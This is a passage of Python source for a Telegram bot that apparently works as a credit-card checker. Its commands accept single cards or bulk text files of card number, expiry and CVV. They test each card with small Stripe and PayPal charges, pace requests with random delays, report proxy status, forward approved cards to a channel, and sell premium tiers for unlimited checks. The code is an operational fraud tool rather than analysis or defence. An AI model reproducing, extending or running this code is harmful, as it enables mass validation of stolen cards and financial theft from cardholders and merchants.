🔄 Connecting to Stripe API
📡 Establishing secure connection

⏳ Status: [▒▒▒▒▒▒▒▒▒▒] 0%
⚡ Please wait while we process your card""", reply_to_message_id=msg.message_id)
    
    if isinstance(processing, list) and len(processing) > 0:
        processing = processing[0]

    def update_loading(message_id, progress, status):
        """Update loading animation"""
        bars = int(progress / 10)
        bar = "█" * bars + "▒" * (10 - bars)
        loading_text = f"""

⚙️ 𝗚𝗔𝗧𝗘𝗪𝗔𝗬 - ⌬ 𝙎𝙏𝙍𝙄𝙋𝙀 𝘾𝙃𝘼𝙍𝙂𝙀 1$

🔮 {status}
🔄 Processing your request
📡 Contacting payment gateway

⏳ Status: [{bar}] {progress}%
⚡ Almost there..."""
        
        try:
            edit_long_message(msg.chat.id, message_id, loading_text)
        except:
            pass

    def check_and_reply():
        try:
            # Stage 1: Initializing
            update_loading(processing.message_id, 20, "Initializing Gateway...")
            time.sleep(0.5)
            
            # Stage 2: Connecting to API
            update_loading(processing.message_id, 40, "Connecting to Stripe API...")
            time.sleep(0.5)
            
            # Stage 3: Validating card
            update_loading(processing.message_id, 60, "Validating card details...")
            time.sleep(0.5)
            
            # Stage 4: Processing payment
            update_loading(processing.message_id, 80, "Processing payment request...")
            time.sleep(0.5)
            
            # Stage 5: Finalizing
            update_loading(processing.message_id, 95, "Finalizing transaction...")
            time.sleep(0.3)
            
            result = check_single_cc(cc)
            
            # Update stats
            if "APPROVED CC ✅" in result:
                update_stats(approved=1)
                update_user_stats(msg.from_user.id, approved=True)
            else:
                update_stats(declined=1)
                update_user_stats(msg.from_user.id, approved=False)
                
            # Add user info and proxy status to the result
            user_info_data = get_user_info(msg.from_user.id)
            user_info = f"{user_info_data['username']} ({user_info_data['user_type']})"
            proxy_status = check_proxy_status()
            
            # Format the result with the new information
            formatted_result = result.replace(
                "🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』",
                f"👤 Checked by: {user_info}\n"
                f"🔌 Proxy: {proxy_status}\n"
                f"🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』"
            )
            
            edit_long_message(msg.chat.id, processing.message_id, formatted_result, parse_mode='HTML')
            
            # If card is approved, send to channel
            if "APPROVED CC ✅" in result:
                notify_channel(formatted_result)
                
        except Exception as e:
            edit_long_message(msg.chat.id, processing.message_id, f"❌ Error: {str(e)}")

    threading.Thread(target=check_and_reply).start()

@bot.message_handler(commands=['mst'])
def mst_handler(msg):
    """Mass check cards using Stripe gateway"""
    if not is_authorized(msg):
        return send_long_message(msg.chat.id, """

🔰 AUTHORIZATION REQUIRED 🔰
 

• You are not authorized to use this command
• Only authorized users can check cards

✗ Use /register to get access
• Or contact an admin: @mhitzxg""", reply_to_message_id=msg.message_id)

    # Check for cooldown (10 minutes for free users)
    if check_cooldown(msg.from_user.id, "mch"):
        return send_long_message(msg.chat.id, """

 ⏰ COOLDOWN ACTIVE ⏰


• You are in cooldown period
• Please wait 10 minutes before mass checking again

✗ Upgrade to premium to remove cooldowns""", reply_to_message_id=msg.message_id)

    if not msg.reply_to_message:
        return send_long_message(msg.chat.id, """

  ⚡ INVALID USAGE ⚡


• Please reply to a .txt file with /mch
• The file should contain card details

✗ Contact admin if you need help: @mhitzxg""", reply_to_message_id=msg.message_id)

    reply = msg.reply_to_message

    # Detect whether it's file or raw text
    if reply.document:
        file_info = bot.get_file(reply.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        text = downloaded_file.decode('utf-8', errors='ignore')
    else:
        text = reply.text or ""
        if not text.strip():
            return send_long_message(msg.chat.id, "❌ Empty text message.", reply_to_message_id=msg.message_id)

    # Extract CCs using improved normalization
    cc_lines = []
    for line in text.splitlines():
        line = line.strip()
        if not line:
            continue

        # Try to normalize each line
        normalized_cc = normalize_card(line)
        if normalized_cc:
            cc_lines.append(normalized_cc)
        else:
            # Fallback to original regex patterns
            found = re.findall(r'\b(?:\d[ -]*?){13,16}\b.*?\|.*?\|.*?\|.*', line)
            if found:
                cc_lines.extend(found)
            else:
                parts = re.findall(r'\d{12,16}[|: -]\d{1,2}[|: -]\d{2,4}[|: -]\d{3,4}', line)
                cc_lines.extend(parts)

    if not cc_lines:
        return send_long_message(msg.chat.id, """

 ❌ NO VALID CARDS ❌


• No valid card formats found in the file
• Please check the file format

Valid format:
`4556737586899855|12|2026|123`

✗ Contact admin if you need help: @mhitzxg""", reply_to_message_id=msg.message_id)

    # Check card limit for free users (10 cards)
    user_id = msg.from_user.id
    if not is_admin(user_id) and not is_premium(user_id) and len(cc_lines) > 10:
        return send_long_message(msg.chat.id, f"""

 ❌ LIMIT EXCEEDED ❌


• Free users can only check 10 cards at once
• You tried to check {len(cc_lines)} cards


💰 UPGRADE TO PREMIUM 💰


• Upgrade to premium for unlimited checks
• Use /subscription to view plans
• Contact @mhitzxg to purchase""", reply_to_message_id=msg.message_id)

    # Check if it's a raw paste (not a file) and limit for free users
    if not reply.document and not is_admin(user_id) and not is_premium(user_id) and len(cc_lines) > 15:
        return send_long_message(msg.chat.id, """

 ❌ TOO MANY CARDS ❌


• You can only check 15 cards in a message
• Please use a .txt file for larger checks""", reply_to_message_id=msg.message_id)

    # Set cooldown for free users (10 minutes)
    if not is_admin(user_id) and not is_premium(user_id):
        set_cooldown(user_id, "mch", 600)  # 10 minutes = 600 seconds

    total = len(cc_lines)
    user_id = msg.from_user.id

    # Determine where to send messages (group or private)
    chat_id = msg.chat.id if msg.chat.type in ["group", "supergroup"] else user_id

    # Combined loading message with counter and status bar
    loading_msg = send_long_message(chat_id, f"""

⚙️ 𝗚𝗔𝗧𝗘𝗪𝗔𝗬 - ⌬ 𝙎𝙏𝙍𝙄𝙋𝙀 𝙈𝘼𝙎𝙎 𝘾𝙃𝘼𝙍𝙂𝙀 1$ ⌬


📊 Total Cards: {total}
🎯 Gateway: Stripe Charge 1$
🔮 Status: Preparing batch...

📊 Progress: [0/{total}] 
🕒 Time Elapsed: 0.00s

▰▱▱▱▱▱▱▱▱▱ 0%

♻️ ⏳ PROCESSING CARDS ⏳ ♻️

• Mass check in progress...
• Please wait, this may take some time

⚡ Status will update automatically""")
    
    if isinstance(loading_msg, list) and len(loading_msg) > 0:
        loading_msg = loading_msg[0]

    def update_combined_loading(message_id, progress, current, status, elapsed):
        """Update combined loading animation with counter and status bar"""
        bars = int(progress / 10)
        bar = "▰" * bars + "▱" * (10 - bars)
        loading_text = f"""

⚙️ 𝗚𝗔𝗧𝗘𝗪𝗔𝗬 - ⌬ 𝙎𝙏𝙍𝙄𝙋𝙀 𝙈𝘼𝙎𝙎 𝘾𝙃𝘼𝙍𝙂𝙀 1$ ⌬


📊 Total Cards: {total}
🎯 Gateway: Stripe Charge 1$
🔮 Status: {status}

📊 Progress: [{current}/{total}] 
🕒 Time Elapsed: {elapsed:.2f}s

{bar} {progress}%

♻️ ⏳ PROCESSING CARDS ⏳ ♻️

• Mass check in progress...
• Please wait, this may take some time

⚡ {random.choice(['Validating cards...', 'Processing payments...', 'Checking limits...', 'Contacting gateway...'])}"""
        
        try:
            edit_long_message(chat_id, message_id, loading_text)
        except:
            pass

    # Shared variables for tracking progress
    approved = 0
    declined = 0
    checked = 0
    approved_cards = []
    approved_message_id = None
    start_time = time.time()

    def process_mass_check():
        nonlocal approved, declined, checked, approved_cards, approved_message_id
        
        try:
            # Process each card individually with progress updates
            for i, cc_line in enumerate(cc_lines, 1):
                current = i
                checked = current
                
                # Update progress
                progress_percent = int((current / total) * 100)
                elapsed = time.time() - start_time
                update_combined_loading(loading_msg.message_id, progress_percent, current, f"Checking card {current}", elapsed)
                
                # Process the card
                result = test_charge(cc_line.strip())
                
                if "APPROVED CC ✅" in result:
                    approved += 1
                    # Add user info and proxy status to approved cards
                    user_info_data = get_user_info(msg.from_user.id)
                    user_info = f"{user_info_data['username']} ({user_info_data['user_type']})"
                    proxy_status = check_proxy_status()
                    
                    # Format the result with the new information
                    formatted_result = result.replace(
                        "🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』",
                        f"👤 Checked by: {user_info}\n"
                        f"🔌 Proxy: {proxy_status}\n"
                        f"🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』"
                    )
                    
                    approved_cards.append(formatted_result)
                    
                    # Send approved card to channel
                    notify_channel(formatted_result)
                    
                    # Create or update the single approved cards message
                    if approved_message_id is None:
                        approved_header = f"""
╔═══════════════════════╗
✅ APPROVED CARDS FOUND ✅
╚═══════════════════════╝

"""
                        full_approved_message = approved_header + formatted_result + f"""

• Approved: {approved} | Declined: {declined} | Checked: {checked}/{total}
"""
                        sent_msg = send_long_message(chat_id, full_approved_message, parse_mode='HTML')
                        if sent_msg and hasattr(sent_msg, 'message_id'):
                            approved_message_id = sent_msg.message_id
                        elif sent_msg and isinstance(sent_msg, list) and len(sent_msg) > 0:
                            approved_message_id = sent_msg[0].message_id
                    else:
                        approved_header = f"""
╔═══════════════════════╗
✅ APPROVED CARDS FOUND ✅
╚═══════════════════════╝

"""
                        all_approved_cards = "\n\n".join(approved_cards)
                        full_approved_message = approved_header + all_approved_cards + f"""

• Approved: {approved} | Declined: {declined} | Checked: {checked}/{total}
"""
                        try:
                            edit_long_message(chat_id, approved_message_id, full_approved_message, parse_mode='HTML')
                        except:
                            sent_msg = send_long_message(chat_id, full_approved_message, parse_mode='HTML')
                            if sent_msg and hasattr(sent_msg, 'message_id'):
                                approved_message_id = sent_msg.message_id
                            elif sent_msg and isinstance(sent_msg, list) and len(sent_msg) > 0:
                                approved_message_id = sent_msg[0].message_id
                else:
                    declined += 1

                # Add delay between cards (except for the last one)
                if i < len(cc_lines):
                    time.sleep(random.uniform(2, 4))

            # Update stats after processing all cards
            update_stats(approved=approved, declined=declined)
            for i in range(approved):
                update_user_stats(msg.from_user.id, approved=True)
            for i in range(declined):
                update_user_stats(msg.from_user.id, approved=False)

            # Delete the loading message
            try:
                bot.delete_message(chat_id, loading_msg.message_id)
            except:
                pass

            # Send final results in the approved message
            total_time = time.time() - start_time
            
            if approved_message_id is not None:
                # Update the approved cards message with final results
                approved_header = f"""
╔═══════════════════════╗
✅ APPROVED CARDS FOUND ✅
╚═══════════════════════╝

"""
                all_approved_cards = "\n\n".join(approved_cards)
                final_approved_message = approved_header + all_approved_cards + f"""

╔═══════════════════════╗
✅ MASS CHECK COMPLETED ✅
╚═══════════════════════╝

📊 Final Results:
• ✅ Approved: {approved}
• ❌ Declined: {declined}
• 📋 Total: {total}
• ⏰ Time: {total_time:.2f}s

🎯 Gateway: Stripe Charge
⚡ Processing complete!

👤 Checked by: {get_user_info(msg.from_user.id)['username']}
🔌 Proxy: {check_proxy_status()}
"""
                try:
                    edit_long_message(chat_id, approved_message_id, final_approved_message, parse_mode='HTML')
                except:
                    # If editing fails, send as new message
                    send_long_message(chat_id, final_approved_message, parse_mode='HTML')
            else:
                # No approved cards, send completion message
                final_message = f"""
╔═══════════════════════╗
✅ MASS CHECK COMPLETED ✅
╚═══════════════════════╝

📊 Final Results:
• ✅ Approved: {approved}
• ❌ Declined: {declined}
• 📋 Total: {total}
• ⏰ Time: {total_time:.2f}s

🎯 Gateway: Stripe Charge
⚡ Processing complete!

👤 Checked by: {get_user_info(msg.from_user.id)['username']}
🔌 Proxy: {check_proxy_status()}

✗ Thank you for using our service"""
                
                send_long_message(chat_id, final_message)

        except Exception as e:
            error_msg = f"""
❌ MASS CHECK ERROR

Error: {str(e)}

Please try again or contact admin."""
            send_long_message(chat_id, error_msg)

    # Start the mass check in a separate thread
    threading.Thread(target=process_mass_check, daemon=True).start()

# ---------------- PayPal Charge Commands ---------------- #

@bot.message_handler(commands=['pp'])
def pp_handler(msg):
    """Check single card using PayPal gateway"""
    if not is_authorized(msg):
        return send_long_message(msg.chat.id, """
  
🔰 AUTHORIZATION REQUIRED 🔰         

• You are not authorized to use this command
• Only authorized users can check cards

• Use /register to get access
• Or contact an admin: @mhitzxg""", reply_to_message_id=msg.message_id)

    # Check for spam (30 second cooldown for free users)
    if check_cooldown(msg.from_user.id, "pp"):
        return send_long_message(msg.chat.id, """

❌ ⏰ COOLDOWN ACTIVE ⏰


• You are in cooldown period
• Please wait 30 seconds before checking again

✗ Upgrade to premium to remove cooldowns""", reply_to_message_id=msg.message_id)

    cc = None

    # Check if user replied to a message
    if msg.reply_to_message:
        # Extract CC from replied message
        replied_text = msg.reply_to_message.text or ""
        cc = normalize_card(replied_text)

        if not cc:
            return send_long_message(msg.chat.id, """

❌ INVALID CARD FORMAT ❌


• The replied message doesn't contain a valid card
• Please use the correct format:

Valid format:
`/pp 4556737586899855|12|2026|123`

✗ Contact admin if you need help: @mhitzxg""", reply_to_message_id=msg.message_id)
    else:
        # Check if CC is provided as argument
        args = msg.text.split(None, 1)
        if len(args) < 2:
            return send_long_message(msg.chat.id, """

  ⚡ INVALID USAGE ⚡


• Please provide a card to check
• Usage: `/pp <card_details>`

Valid format:
`/pp 4556737586899855|12|2026|123`

• Or reply to a message containing card details with /pp

✗ Contact admin if you need help: @mhitzxg""", reply_to_message_id=msg.message_id)

        # Try to normalize the provided CC
        raw_input = args[1]

        # Check if it's already in valid format
        if re.match(r'^\d{16}\|\d{2}\|\d{2,4}\|\d{3,4}$', raw_input):
            cc = raw_input
        else:
            # Try to normalize the card
            cc = normalize_card(raw_input)

            # If normalization failed, use the original input
            if not cc:
                cc = raw_input

    # Set cooldown for free users (30 seconds)
    if not is_admin(msg.from_user.id) and not is_premium(msg.from_user.id):
        set_cooldown(msg.from_user.id, "pp", 10)

    processing = send_long_message(msg.chat.id, """

⚙️ 𝗚𝗔𝗧𝗘𝗪𝗔𝗬 - ⌬ 𝙋𝘼𝙔𝙋𝘼𝙇 𝘾𝙃𝘼𝙍𝙂𝙀 - 𝟐💲


🔮 Initializing PayPal Gateway...
🔄 Connecting to PayPal API
📡 Establishing secure connection

⏳ Status: [▒▒▒▒▒▒▒▒▒▒] 0%
⚡ Please wait while we process your card""", reply_to_message_id=msg.message_id)
    
    if isinstance(processing, list) and len(processing) > 0:
        processing = processing[0]

    def update_paypal_loading(message_id, progress, status):
        """Update PayPal loading animation"""
        bars = int(progress / 10)
        bar = "█" * bars + "▒" * (10 - bars)
        loading_text = f"""

⚙️ 𝗚𝗔𝗧𝗘𝗪𝗔𝗬 - ⌬ 𝙋𝘼𝙔𝙋𝘼𝙇 𝘾𝙃𝘼𝙍𝙂𝙀 - 𝟐💲

🔮 {status}
🔄 Processing your request
📡 Contacting PayPal gateway

⏳ Status: [{bar}] {progress}%
⚡ Almost there..."""
        
        try:
            edit_long_message(msg.chat.id, message_id, loading_text)
        except:
            pass

    def check_and_reply():
        try:
            # Stage 1: Initializing
            update_paypal_loading(processing.message_id, 15, "Initializing PayPal...")
            time.sleep(0.4)
            
            # Stage 2: Connecting to API
            update_paypal_loading(processing.message_id, 35, "Connecting to PayPal API...")
            time.sleep(0.4)
            
            # Stage 3: Validating card
            update_paypal_loading(processing.message_id, 55, "Validating card details...")
            time.sleep(0.4)
            
            # Stage 4: Processing payment
            update_paypal_loading(processing.message_id, 75, "Processing PayPal request...")
            time.sleep(0.4)
            
            # Stage 5: Finalizing
            update_paypal_loading(processing.message_id, 90, "Finalizing transaction...")
            time.sleep(0.3)
            
            result = check_card_paypal(cc)
            
            # Update stats
            if "APPROVED CC ✅" in result:
                update_stats(approved=1)
                update_user_stats(msg.from_user.id, approved=True)
            else:
                update_stats(declined=1)
                update_user_stats(msg.from_user.id, approved=False)
                
            # Add user info and proxy status to the result
            user_info_data = get_user_info(msg.from_user.id)
            user_info = f"{user_info_data['username']} ({user_info_data['user_type']})"
            proxy_status = check_proxy_status()
            
            # Format the result with the new information
            formatted_result = result.replace(
                "🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』",
                f"👤 Checked by: {user_info}\n"
                f"🔌 Proxy: {proxy_status}\n"
                f"🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』"
            )
            
            edit_long_message(msg.chat.id, processing.message_id, formatted_result, parse_mode='HTML')
            
            # If card is approved, send to channel
            if "APPROVED CC ✅" in result:
                notify_channel(formatted_result)
                
        except Exception as e:
            edit_long_message(msg.chat.id, processing.message_id, f"❌ Error: {str(e)}")

    threading.Thread(target=check_and_reply).start()

@bot.message_handler(commands=['mpp'])
def mpp_handler(msg):
    """Mass check cards using PayPal gateway"""
    if not is_authorized(msg):
        return send_long_message(msg.chat.id, """

🔰 AUTHORIZATION REQUIRED 🔰
 

• You are not authorized to use this command
• Only authorized users can check cards

✗ Use /register to get access
• Or contact an admin: @mhitzxg""", reply_to_message_id=msg.message_id)

    # Check for cooldown (10 minutes for free users)
    if check_cooldown(msg.from_user.id, "mpp"):
        return send_long_message(msg.chat.id, """

 ⏰ COOLDOWN ACTIVE ⏰


• You are in cooldown period
• Please wait 10 minutes before mass checking again

✗ Upgrade to premium to remove cooldowns""", reply_to_message_id=msg.message_id)

    if not msg.reply_to_message:
        return send_long_message(msg.chat.id, """

  ⚡ INVALID USAGE ⚡


• Please reply to a .txt file with /mpp
• The file should contain card details

✗ Contact admin if you need help: @mhitzxg""", reply_to_message_id=msg.message_id)

    reply = msg.reply_to_message

    # Detect whether it's file or raw text
    if reply.document:
        file_info = bot.get_file(reply.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        text = downloaded_file.decode('utf-8', errors='ignore')
    else:
        text = reply.text or ""
        if not text.strip():
            return send_long_message(msg.chat.id, "❌ Empty text message.", reply_to_message_id=msg.message_id)

    # Extract CCs using improved normalization
    cc_lines = []
    for line in text.splitlines():
        line = line.strip()
        if not line:
            continue

        # Try to normalize each line
        normalized_cc = normalize_card(line)
        if normalized_cc:
            cc_lines.append(normalized_cc)
        else:
            # Fallback to original regex patterns
            found = re.findall(r'\b(?:\d[ -]*?){13,16}\b.*?\|.*?\|.*?\|.*', line)
            if found:
                cc_lines.extend(found)
            else:
                parts = re.findall(r'\d{12,16}[|: -]\d{1,2}[|: -]\d{2,4}[|: -]\d{3,4}', line)
                cc_lines.extend(parts)

    if not cc_lines:
        return send_long_message(msg.chat.id, """

 ❌ NO VALALID CARDS ❌


• No valid card formats found the file
• Please check the file format

Valid format:
`4556737586899855|12|2026|123`

✗ Contact admin if you need help: @mhitzxg""", reply_to_message_id=msg.message_id)

    # Check card limit for free users (10 cards)
    user_id = msg.from_user.id
    if not is_admin(user_id) and not is_premium(user_id) and len(cc_lines) > 10:
        return send_long_message(msg.chat.id, f"""

 ❌ LIMIT EXCEEDED ❌


• Free users can only check 10 cards at once
• You tried to check {len(cc_lines)} cards


💰 UPGRADE TO PREMIUM 💰


• Upgrade to premium for unlimited checks
• Use /subscription to view plans
• Contact @mhitzxg to purchase""", reply_to_message_id=msg.message_id)

    # Check if it's a raw paste (not a file) and limit for free users
    if not reply.document and not is_admin(user_id) and not is_premium(user_id) and len(cc_lines) > 15:
        return send_long_message(msg.chat.id, """

 ❌ TOO MANY CARDS ❌


• You can only check 15 cards in a message
• Please use a .txt file for larger checks""", reply_to_message_id=msg.message_id)

    # Set cooldown for free users (10 minutes)
    if not is_admin(user_id) and not is_premium(user_id):
        set_cooldown(user_id, "mpp", 600)  # 10 minutes = 600 seconds

    total = len(cc_lines)
    user_id = msg.from_user.id

    # Determine where to send messages (group or private)
    chat_id = msg.chat.id if msg.chat.type in ["group", "supergroup"] else user_id

    # Combined loading message with counter and status bar
    loading_msg = send_long_message(chat_id, f"""

⚙️ 𝗚𝗔𝗧𝗘𝗪𝗔𝗬 - ⌬ 𝙋𝘼𝙔𝙋𝘼𝙇 𝙈𝘼𝙎𝙎 𝘾𝙃𝘼𝙍𝙂𝙀 - 𝟐💲


📊 Total Cards: {total}
🎯 Gateway: PayPal Charge 2$
🔮 Status: Initializing batch...

📊 Progress: [0/{total}] 
🕒 Time Elapsed: 0.00s

▰▱▱▱▱▱▱▱▱▱ 0%

♻️ ⏳ PROCESSING CARDS ⏳ ♻️

• PayPal mass check in progress...
• Please wait, this may take some time

⚡ Status will update automatically""")
    
    if isinstance(loading_msg, list) and len(loading_msg) > 0:
        loading_msg = loading_msg[0]

    def update_combined_loading(message_id, progress, current, status, elapsed):
        """Update combined loading animation with counter and status bar"""
        bars = int(progress / 10)
        bar = "▰" * bars + "▱" * (10 - bars)
        loading_text = f"""

⚙️ 𝗚𝗔𝗧𝗘𝗪𝗔𝗬 - ⌬ 𝙋𝘼𝙔𝙋𝘼𝙇 𝙈𝘼𝙎𝙎 𝘾𝙃𝘼𝙍𝙂𝙀 - 𝟐💲


📊 Total Cards: {total}
🎯 Gateway: PayPal Charge 2$
🔮 Status: {status}

📊 Progress: [{current}/{total}] 
🕒 Time Elapsed: {elapsed:.2f}s

{bar} {progress}%

♻️ ⏳ PROCESSING CARDS ⏳ ♻️

• PayPal mass check in progress...
• Please wait, this may take some time

⚡ {random.choice(['Validating cards...', 'Processing PayPal...', 'Checking limits...', 'Contacting gateway...'])}"""
        
        try:
            edit_long_message(chat_id, message_id, loading_text)
        except:
            pass

    approved, declined, checked = 0, 0, 0
    approved_cards = []  # To store all approved cards
    approved_message_id = None  # To track the single approved cards message
    start_time = time.time()

    def process_all():
        nonlocal approved, declined, checked, approved_cards, approved_message_id
        
        for i, cc in enumerate(cc_lines, 1):
            try:
                # Update combined loading animation
                progress = int((i / len(cc_lines)) * 100)
                elapsed = time.time() - start_time
                update_combined_loading(loading_msg.message_id, progress, i, f"Checking card {i}", elapsed)
                
                checked += 1
                result = check_card_paypal(cc.strip())
                if "APPROVED CC ✅" in result:
                    approved += 1
                    # Add user info and proxy status to approved cards
                    user_info_data = get_user_info(msg.from_user.id)
                    user_info = f"{user_info_data['username']} ({user_info_data['user_type']})"
                    proxy_status = check_proxy_status()
                    
                    # Format the result with the new information
                    formatted_result = result.replace(
                        "🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』",
                        f"👤 Checked by: {user_info}\n"
                        f"🔌 Proxy: {proxy_status}\n"
                        f"🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』"
                    )
                    
                    approved_cards.append(formatted_result)  # Store approved card with original format
                    
                    # Send approved card to channel
                    notify_channel(formatted_result)
                    
                    # Create or update the single approved cards message
                    if approved_message_id is None:
                        # First approved card - create the message
                        approved_header = f"""
╔═══════════════════════╗
✅ APPROVED CARDS FOUND ✅
╚═══════════════════════╝

"""
                        approved_message = approved_header + formatted_result + f"""

• Approved: {approved} | Declined: {declined} | Checked: {checked}/{total}
"""
                        sent_msg = send_long_message(chat_id, approved_message, parse_mode='HTML')
                        if sent_msg and hasattr(sent_msg, 'message_id'):
                            approved_message_id = sent_msg.message_id
                        elif sent_msg and isinstance(sent_msg, list) and len(sent_msg) > 0:
                            approved_message_id = sent_msg[0].message_id
                    else:
                        # Update existing message with new approved card
                        approved_header = f"""
╔═══════════════════════╗
✅ APPROVED CARDS FOUND ✅
╚═══════════════════════╝

"""
                        all_approved_cards = "\n\n".join(approved_cards)
                        approved_message = approved_header + all_approved_cards + f"""

• Approved: {approved} | Declined: {declined} | Checked: {checked}/{total}
"""
                        try:
                            edit_long_message(chat_id, approved_message_id, approved_message, parse_mode='HTML')
                        except:
                            # If message editing fails, send a new one
                            sent_msg = send_long_message(chat_id, approved_message, parse_mode='HTML')
                            if sent_msg and hasattr(sent_msg, 'message_id'):
                                approved_message_id = sent_msg.message_id
                            elif sent_msg and isinstance(sent_msg, list) and len(sent_msg) > 0:
                                approved_message_id = sent_msg[0].message_id
                else:
                    declined += 1

                time.sleep(1)  # Reduced sleep time for faster processing
            except Exception as e:
                send_long_message(user_id, f"❌ Error: {e}")

        # Update stats after processing all cards
        update_stats(approved=approved, declined=declined)
        for i in range(approved):
            update_user_stats(msg.from_user.id, approved=True)
        for i in range(declined):
            update_user_stats(msg.from_user.id, approved=False)

        # Delete the loading message
        try:
            bot.delete_message(chat_id, loading_msg.message_id)
        except:
            pass

        # Send final results in the approved message
        total_time = time.time() - start_time
        
        if approved_message_id is not None:
            # Update the approved cards message with final results
            approved_header = f"""
╔═══════════════════════╗
✅ APPROVED CARDS FOUND ✅
╚═══════════════════════╝

"""
            all_approved_cards = "\n\n".join(approved_cards)
            final_approved_message = approved_header + all_approved_cards + f"""

╔═══════════════════════╗
✅ MASS CHECK COMPLETED ✅
╚═══════════════════════╝

📊 Final Results:
• ✅ Approved: {approved}
• ❌ Declined: {declined}
• 📋 Total: {total}
• ⏰ Time: {total_time:.2f}s

🎯 Gateway: PayPal Charge 2$
⚡ Processing complete!

👤 Checked by: {get_user_info(msg.from_user.id)['username']}
🔌 Proxy: {check_proxy_status()}
"""
            try:
                edit_long_message(chat_id, approved_message_id, final_approved_message, parse_mode='HTML')
            except:
                # If editing fails, send as new message
                send_long_message(chat_id, final_approved_message, parse_mode='HTML')
        else:
            # No approved cards, send completion message
            final_message = f"""
╔═══════════════════════╗
   ✅ MASS CHECK COMPLETED ✅
╚═══════════════════════╝

📊 Final Results:
• ✅ Approved: {approved}
• ❌ Declined: {declined}
• 📋 Total: {total}
• ⏰ Time: {total_time:.2f}s

🎯 Gateway: PayPal Charge 2$
⚡ Processing complete!

👤 Checked by: {get_user_info(msg.from_user.id)['username']}
🔌 Proxy: {check_proxy_status()}

✗ Thank you for using our service"""
            send_long_message(chat_id, final_message)

    threading.Thread(target=process_all).start()
    
# ---------------- Start Bot ---------------- #
app = Flask('')

@app.route('/')
def home():
    return "Bot is alive!"

def run():
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    t = threading.Thread(target=run)
    t.start()

keep_alive()

# Start bot with error handling
def start_bot():
    while True:
        try:
            print("Starting bot...")
            bot.infinity_polling(timeout=60, long_polling_timeout=60)
        except Exception as e:
            print(f"Bot error: {e}")
            print("Restarting bot in 5 seconds...")
            time.sleep(5)

if __name__ == '__main__':
    start_bot()
